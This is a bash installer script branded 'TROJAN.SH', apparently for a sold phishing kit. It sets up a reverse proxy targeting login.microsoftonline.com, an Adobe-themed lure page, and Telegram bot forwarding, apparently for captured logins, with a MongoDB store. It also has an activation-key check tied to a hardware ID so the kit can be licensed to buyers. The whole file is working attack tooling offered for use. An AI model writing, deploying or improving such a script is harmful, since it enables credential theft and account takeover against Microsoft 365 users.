#!/bin/bash
# 🏛️ TROJAN.SH - PRO EDITION
# ------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# 1. THE "FPAGE" STYLE HEADER
clear
echo -e "${BLUE}"
echo " ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗"
echo " ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║"
echo "    ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║"
echo "    ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║"
echo "    ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║"
echo "    ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝"
echo -e "${NC}"
echo -e "${RED}             [ SECURITY & LEGAL PORTAL ]${NC}"
echo " -------------------------------------------------------"

# 2. HWID GENERATION (Unique to his VPS)
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model name" | md5sum | cut -c1-12)

echo -e "${GREEN}[+] SYSTEM HWID:${NC} $HWID"
echo -e "${BLUE}[!] Send this key to @YourTelegram to activate.${NC}"
echo " -------------------------------------------------------"

# 3. ACTIVATION LOCK
read -p "ENTER ACTIVATION KEY: " USER_KEY

# REPLACE 'ADMIN_SECRET_KEY' WITH YOUR ACTUAL KEY FOR HIM
if [ "$USER_KEY" != "ACTIVATE-9928-PRO" ]; then
    echo -e "${RED}[error] Hardware ID not registered.${NC}"
    echo -e "${RED}[error] Unauthorized from second request.${NC}"
    exit 1
fi

echo -e "${GREEN}[success] Activation Successful. Welcome back.${NC}"
sleep 2

# 4. INTERACTIVE SETUP WIZARD
echo -e "\n${BLUE}--- CONFIGURATION SETUP ---${NC}"
read -p "Enter Domain: " USER_DOMAIN
read -p "Enter Telegram Bot Token: " TG_TOKEN
read -p "Enter Telegram Chat ID: " TG_ID
read -p "Enter MongoDB User: " MONGO_USER
read -p "Enter MongoDB Pass: " MONGO_PASS

# 5. CORE INSTALLATION (Silent)
echo -ne "${BLUE}[+] Initializing Engine...${NC}"
sudo apt update -y > /dev/null 2>&1
sudo apt install -y golang-go git make screen php-cli > /dev/null 2>&1
echo -e "${GREEN} DONE${NC}"

# 6. CREATE MASTER CONFIG
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "target": "login.microsoftonline.com",
  "terminateUrl": "https://www.adobe.com",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "mongodb": "mongodb://$MONGO_USER:$MONGO_PASS@localhost:27017"
}
EOF

# 7. SETUP THE "START" COMMAND
cat << 'EOF' > /root/run.sh
#!/bin/bash
sudo fuser -k 80/tcp 443/tcp 2>/dev/null
pkill proxy
pkill php
screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
screen -dmS trojan /root/engine/dist/proxy -config /root/config.json
echo "TROJAN ENGINE LIVE."
EOF
chmod +x /root/run.sh

# 8. ADD TERMINAL ALIASES
echo "alias start='/root/run.sh'" >> ~/.bashrc
echo "alias logs='tail -f /root/engine/logs/proxy.log'" >> ~/.bashrc
echo "alias update='changedomain'" >> ~/.bashrc

echo -e "\n${GREEN}[+] DEPLOYMENT COMPLETE.${NC}"
echo -e "Type 'source ~/.bashrc' then 'start' to begin."
